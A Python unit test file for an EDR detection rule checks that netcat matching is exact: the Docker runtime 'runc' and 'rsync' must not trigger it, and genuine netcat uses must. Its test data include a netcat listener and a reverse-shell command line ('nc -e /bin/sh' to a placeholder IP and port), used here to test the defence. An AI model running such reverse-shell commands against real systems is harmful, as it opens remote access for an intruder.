"""EDR IOA 규칙 — 바이너리 이름 매칭은 정확 일치여야 한다."""
from modules.edr import EDRSensor


class Sock:
    def emit(self, *a, **k): pass


def _sensor():
    return EDRSensor(Sock(), {"EDR_RESPONSE_MODE": "simulate"})


def test_runc_is_not_netcat():
    """라벨링 큐 실측 1위(108건): 'runc'(도커 런타임)가 endswith('nc') 로 netcat 에 걸렸다."""
    s = _sensor()
    for pr in ({"name": "runc", "cmdline": "runc --root /var/run/docker/runtime-runc/moby", "exe_path": "/usr/bin/runc"},
               {"name": "runc:[2:INIT]", "cmdline": "runc init", "exe_path": ""},
               {"name": "rsync", "cmdline": "rsync -a a b", "exe_path": "/usr/bin/rsync"}):
        risk, ioas = s._evaluate(pr)
        assert not any(i["rule"].startswith("IOA-BIN-nc") for i in ioas), pr["name"]


def test_real_netcat_forms_still_match():
    s = _sensor()
    for pr in ({"name": "nc", "cmdline": "nc -lvp 4444", "exe_path": "/usr/bin/nc"},
               {"name": "netcat-ish", "cmdline": "/usr/bin/nc -e /bin/sh 1.2.3.4 4444", "exe_path": ""},
               {"name": "x", "cmdline": "", "exe_path": "/opt/tools/nc"}):
        _, ioas = s._evaluate(pr)
        assert any(i["rule"] == "IOA-BIN-nc" for i in ioas), pr
